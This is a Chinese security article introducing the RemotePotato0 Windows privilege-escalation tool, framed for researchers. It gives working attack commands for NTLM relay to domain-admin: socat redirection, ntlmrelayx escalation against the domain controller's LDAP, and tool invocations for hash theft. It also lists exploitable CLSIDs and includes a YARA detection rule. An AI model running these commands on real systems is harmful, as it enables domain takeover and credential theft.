@@ -1,0 +1,228 @@
+![](https://image.3001.net/images/20210825/1629867928_6125cf9823cd4cd518db1.png!small)
+
+## 关于RemotePotato0
+
+RemotePotato0是一款功能强大的Windows提权工具，本质上来说RemotePotato0是一个漏洞利用工具，可以帮助广大研究人员在Windows系统上，从一个普通用户提权至域管理员权限。
+
+RemotePotato0可以利用DCOM激活服务，并触发针对当前登录到目标计算机的任何用户的NTLM身份验证。与此同时，该工具还需要在相同设备上已经有特权用户登录了（比如说，域管理员用户）。一旦触发NTLM
+type1，RemotePotato0将设置一个跨协议中继服务器，该服务器将负责接收特权type1消息，并通过解包RPC协议和HTTP打包身份验证，然后将其中继到第三个资源。在接收端，你可以设置另一个中继节点（如ntlmrelayx）或直接中继到特权资源。除此之外，RemotePotato0还允许抓取和窃取登录到目标设备上的每个用户的NTLMv2哈希。
+
+## 源码获取
+
+广大研究人员可以使用下列命令将该项目源码克隆至本地：
+
+    
+    
+    git clone https://github.com/antonioCoco/RemotePotato0.git
+
+## 使用场景
+
+> 攻击设备（10.0.0.20）
+>
+> 目标设备（10.0.0.45）
+>
+> 目标域控制器（10.0.0.10）
+
+### 模块0 - Rpc2Http跨协议中继服务器 + potato触发器
+
+    
+    
+    sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.0.45:9999 &
+    
+    sudo ntlmrelayx.py -t ldap://10.0.0.10 --no-wcf-server --escalate-user normal_user
+
+注意：如果你操作的是Windows Server <= 2016，你可以避免使用网络重定向器（socat）：
+
+    
+    
+    query user
+    
+    .\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1
+
+### 模块1 - Rpc2Http跨协议中继服务器
+
+    
+    
+    .\RemotePotato0.exe -m 1 -l 9997 -r 10.0.0.20
+    
+    
+    rp*cping -s 127.0.0.1 -e 9997 -a connect -u ntlm
+
+### 模块2 - RPC捕捉（哈希）服务器
+
+    
+    
+    .\RemotePotato0.exe -m 3 -l 9997
+    
+    
+    rp*cping -s 127.0.0.1 -e 9997 -a connect -u ntlm
+
+## 工具使用
+
+    
+    
+    RemotePotato0
+    
+            @splinter_code & @decoder_it
+    
+     
+    
+     
+    
+     
+    
+    Mandatory args:
+    
+    -m module
+    
+            Allowed values:
+    
+            0 - Rpc2Http cross protocol relay server + potato trigger (default)
+    
+            1 - Rpc2Http cross protocol relay server
+    
+            2 - Rpc capture (hash) server + potato trigger
+    
+            3 - Rpc capture (hash) server
+    
+     
+    
+     
+    
+    Other args: (someone could be mandatory and/or optional based on the module you use)
+    
+    -r 远程HTTP中继服务器IP
+    
+    -t 远程HTTP中继服务器端口 (默认为80)
+    
+    -x 流氓Oxid解析器IP (默认为127.0.0.1)
+    
+    -p 流氓Oxid解析器端口 (默认为9999)
+    
+    -l RPC中继服务器监听端口 (默认为9997)
+    
+    -s 跨会话激活攻击的目标会话IP (默认为disabled)
+    
+    -c CLSID (默认为{5167B42F-C111-47A1-ACC4-8EABE61B0B54})
+
+## 工具演示
+
+ **跨会话激活：** 【[
+_GIF_](https://github.com/antonioCoco/RemotePotato0/raw/main/demo_cross_session.gif)】
+
+ **哈希窃取：** 【[
+_GIF_](https://github.com/antonioCoco/RemotePotato0/raw/main/demo_hash_stealer.gif)】
+
+## CLSID列表
+
+该工具还提供了一个可用的针对各种Windows版本的CLSID列表：
+
+### Windows Server 2019
+
+    
+    
+    {0002DF02-0000-0000-C000-000000000046} - BrowserBroker Class   
+    
+    {0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4} - AuthBrokerUI
+    
+    {5167B42F-C111-47A1-ACC4-8EABE61B0B54} - Easconsent.dll
+    
+    {924DC564-16A6-42EB-929A-9A61FA7DA06F} - Authentication UI CredUI Out of Proc Helper for Non-AppContainer Clients  
+    
+    {934b410c-43e4-415e-9935-fbc081ba93a9} - UserInfoDialog   
+    
+    {BA441419-0B3F-4FB6-A903-D16CC14CCA44} - CLSID_LockScreenContentionFlyout
+    
+    {c58ca859-80bc-48df-8f06-ffa94a405bff} - Picker Host   
+    
+    {f65817c8-dd85-4136-89f0-b9d12939f2c4} - IsolatedMessageDialogFactory  
+    
+    {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} - SPPUIObjectInteractive Class
+    
+    {f8842f8e-dafe-4b37-9d38-4e0714a61149} - CastServerInteractiveUser
+
+### Windows Server 2016
+
+    
+    
+    {924DC564-16A6-42EB-929A-9A61FA7DA06F}
+    
+    {f65817c8-dd85-4136-89f0-b9d12939f2c4}
+    
+    {BA441419-0B3F-4FB6-A903-D16CC14CCA44}
+    
+    {0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4}
+    
+    {934b410c-43e4-415e-9935-fbc081ba93a9}
+    
+    {f8842f8e-dafe-4b37-9d38-4e0714a61149}
+    
+    {0002DF02-0000-0000-C000-000000000046}
+    
+    {5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+    
+    {c58ca859-80bc-48df-8f06-ffa94a405bff}
+    
+    {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+
+### Windows Server 2008 R2
+
+    
+    
+    {FCC74B77-EC3E-4dd8-A80B-008A702075A9}
+    
+    {9BA05972-F6A8-11CF-A442-00A0C90A8F39}
+    
+    {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+
+## 如何检测
+
+我们可以使用下列Yara规则来检测RemotePotato0：
+
+    
+    
+    rule SentinelOne_RemotePotato0_privesc {
+    
+        meta:
+    
+            author = "SentinelOne"
+    
+            description = "Detects RemotePotato0 binary"
+    
+            reference = "https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop"
+    
+            
+    
+        strings:
+    
+            $import1 = "CoGetInstanceFromIStorage"
+    
+            $istorage_clsid = "{00000306-0000-0000-c000-000000000046}" nocase wide ascii
+    
+            $meow_header = { 4d 45 4f 57 }
+    
+            $clsid1 = "{11111111-2222-3333-4444-555555555555}" nocase wide ascii
+    
+            $clsid2 = "{5167B42F-C111-47A1-ACC4-8EABE61B0B54}" nocase wide ascii
+    
+            
+    
+        condition:        
+    
+            (uint16(0) == 0x5A4D) and $import1 and $istorage_clsid and $meow_header and 1 of ($clsid*)
+    
+    }
+
+## 项目地址
+
+ **RemotePotato0：** 【[
+_GitHub传送门_](https://github.com/antonioCoco/RemotePotato0)】
+
+## 参考资料
+
+> [ _http://ohpe.it/juicy-potato/CLSID/_](http://ohpe.it/juicy-potato/CLSID/)
+>
+> [ _https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-> eop/_](https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-> eop/)
+>
+> [ _https://www.tiraniddo.dev/2021/04/standard-activating-yourself-> to.html﻿_](https://www.tiraniddo.dev/2021/04/standard-activating-yourself-> to.html)
+
